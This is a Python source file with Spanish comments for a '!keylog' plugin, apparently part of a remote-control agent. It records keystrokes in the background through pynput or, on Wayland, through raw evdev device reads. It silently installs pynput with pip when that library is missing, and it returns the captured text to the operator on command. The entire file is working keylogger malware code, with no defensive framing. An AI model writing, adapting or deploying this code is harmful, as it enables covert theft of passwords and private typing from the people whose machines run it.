"""
Plugin !keylog — captura keystrokes en background.
Intenta pynput (X11/Windows). Si falla por Wayland, cae a evdev (Linux, requiere grupo input).
!keylog start  → inicia captura
!keylog stop   → detiene y devuelve todo el buffer
!keylog dump   → devuelve buffer sin detener
"""

import threading

_buffer: list[str] = []
_lock = threading.Lock()
_listener = None
_listener_type = None   # 'pynput' | 'evdev'
_evdev_stop = None      # threading.Event cuando modo evdev


def _on_press(key):
    try:
        char = key.char
    except AttributeError:
        char = None
    if not char:
        try:
            char = f"[{key.name}]"
        except AttributeError:
            char = f"[{key}]"
    with _lock:
        _buffer.append(char)


def _start_pynput(keyboard):
    global _listener, _listener_type
    lst = keyboard.Listener(on_press=_on_press)
    lst.daemon = True
    lst.start()
    _listener = lst
    _listener_type = "pynput"


_EVDEV_CHARS = {
    "KEY_A":"a","KEY_B":"b","KEY_C":"c","KEY_D":"d","KEY_E":"e","KEY_F":"f",
    "KEY_G":"g","KEY_H":"h","KEY_I":"i","KEY_J":"j","KEY_K":"k","KEY_L":"l",
    "KEY_M":"m","KEY_N":"n","KEY_O":"o","KEY_P":"p","KEY_Q":"q","KEY_R":"r",
    "KEY_S":"s","KEY_T":"t","KEY_U":"u","KEY_V":"v","KEY_W":"w","KEY_X":"x",
    "KEY_Y":"y","KEY_Z":"z",
    "KEY_1":"1","KEY_2":"2","KEY_3":"3","KEY_4":"4","KEY_5":"5",
    "KEY_6":"6","KEY_7":"7","KEY_8":"8","KEY_9":"9","KEY_0":"0",
    "KEY_SPACE":" ","KEY_ENTER":"\n","KEY_TAB":"\t","KEY_BACKSPACE":"[BS]",
    "KEY_MINUS":"-","KEY_EQUAL":"=","KEY_LEFTBRACE":"[","KEY_RIGHTBRACE":"]",
    "KEY_SEMICOLON":";","KEY_APOSTROPHE":"'","KEY_GRAVE":"`",
    "KEY_BACKSLASH":"\\","KEY_COMMA":",","KEY_DOT":".","KEY_SLASH":"/",
}
_EVDEV_SHIFT = {
    "KEY_A":"A","KEY_B":"B","KEY_C":"C","KEY_D":"D","KEY_E":"E","KEY_F":"F",
    "KEY_G":"G","KEY_H":"H","KEY_I":"I","KEY_J":"J","KEY_K":"K","KEY_L":"L",
    "KEY_M":"M","KEY_N":"N","KEY_O":"O","KEY_P":"P","KEY_Q":"Q","KEY_R":"R",
    "KEY_S":"S","KEY_T":"T","KEY_U":"U","KEY_V":"V","KEY_W":"W","KEY_X":"X",
    "KEY_Y":"Y","KEY_Z":"Z",
    "KEY_1":"!","KEY_2":"@","KEY_3":"#","KEY_4":"$","KEY_5":"%",
    "KEY_6":"^","KEY_7":"&","KEY_8":"*","KEY_9":"(","KEY_0":")",
    "KEY_SPACE":" ","KEY_ENTER":"\n","KEY_TAB":"\t","KEY_BACKSPACE":"[BS]",
    "KEY_MINUS":"_","KEY_EQUAL":"+","KEY_LEFTBRACE":"{","KEY_RIGHTBRACE":"}",
    "KEY_SEMICOLON":":","KEY_APOSTROPHE":'"',"KEY_GRAVE":"~",
    "KEY_BACKSLASH":"|","KEY_COMMA":"<","KEY_DOT":">","KEY_SLASH":"?",
}


def _start_evdev():
    global _listener, _listener_type, _evdev_stop
    import evdev
    from evdev import InputDevice, ecodes, categorize

    kbd = None
    for path in evdev.list_devices():
        try:
            dev = InputDevice(path)
            caps = dev.capabilities()
            if ecodes.EV_KEY in caps and ecodes.KEY_A in caps.get(ecodes.EV_KEY, []):
                kbd = dev
                break
        except Exception:
            continue

    if kbd is None:
        raise RuntimeError(
            "No se encontró teclado en /dev/input/ — asegúrate de estar en el grupo 'input'"
        )

    stop_evt = threading.Event()
    _evdev_stop = stop_evt

    def _reader():
        import select
        shift = False
        try:
            while not stop_evt.is_set():
                r, _, _ = select.select([kbd.fd], [], [], 0.5)
                if not r:
                    continue
                for event in kbd.read():
                    if event.type != ecodes.EV_KEY:
                        continue
                    ke = categorize(event)
                    kc = ke.keycode if isinstance(ke.keycode, str) else ke.keycode[0]
                    if ke.keystate == ke.key_down:
                        if kc in ("KEY_LSHIFT", "KEY_RSHIFT"):
                            shift = True
                        else:
                            char = (_EVDEV_SHIFT if shift else _EVDEV_CHARS).get(kc, f"[{kc}]")
                            with _lock:
                                _buffer.append(char)
                    elif ke.keystate == ke.key_up:
                        if kc in ("KEY_LSHIFT", "KEY_RSHIFT"):
                            shift = False
        except Exception:
            pass

    t = threading.Thread(target=_reader, daemon=True)
    t.start()
    _listener = t
    _listener_type = "evdev"


def _import_pynput():
    try:
        from pynput import keyboard
        return keyboard
    except ImportError:
        return None


def _ensure_pynput():
    kb = _import_pynput()
    if kb is not None:
        return kb
    import subprocess, sys
    try:
        subprocess.run(
            [sys.executable, "-m", "pip", "install", "pynput", "--quiet",
             "--break-system-packages"],
            capture_output=True, timeout=60, check=True,
        )
    except Exception as exc:
        raise ImportError(f"no se pudo instalar pynput: {exc}")
    kb = _import_pynput()
    if kb is None:
        raise ImportError("pynput instalado pero no importable — reinicia el agente")
    return kb


def _is_active():
    return _listener is not None and _listener.is_alive()


def _stop():
    global _listener, _listener_type, _evdev_stop
    if _listener is None:
        return
    if _listener_type == "pynput":
        _listener.stop()
    elif _evdev_stop is not None:
        _evdev_stop.set()
    _listener = None
    _listener_type = None
    _evdev_stop = None


def run(args: str) -> tuple[int, str, str]:
    cmd = args.strip().lower()

    if cmd == "start":
        if _is_active():
            return 0, f"Keylogger ya activo (modo: {_listener_type})", ""
        # Intentar pynput primero
        pynput_err = ""
        try:
            kb = _ensure_pynput()
            _start_pynput(kb)
            return 0, "Keylogger iniciado (pynput) — usa !keylog dump para ver capturas", ""
        except Exception as e1:
            pynput_err = str(e1)
        # Fallback evdev (Wayland)
        try:
            _start_evdev()
            return 0, "Keylogger iniciado (evdev/Wayland) — usa !keylog dump para ver capturas", ""
        except Exception as e2:
            return 1, "", f"No se pudo iniciar keylogger.\n  pynput: {pynput_err}\n  evdev: {e2}"

    if cmd == "stop":
        _stop()
        with _lock:
            captured = "".join(_buffer)
            _buffer.clear()
        return 0, f"Keylogger detenido.\n\n--- CAPTURADO ---\n{captured or '(vacío)'}", ""

    if cmd == "dump":
        with _lock:
            captured = "".join(_buffer)
        return 0, f"--- BUFFER ACTUAL ---\n{captured or '(vacío)'}", ""

    return 1, "", "Uso: !keylog start | stop | dump"
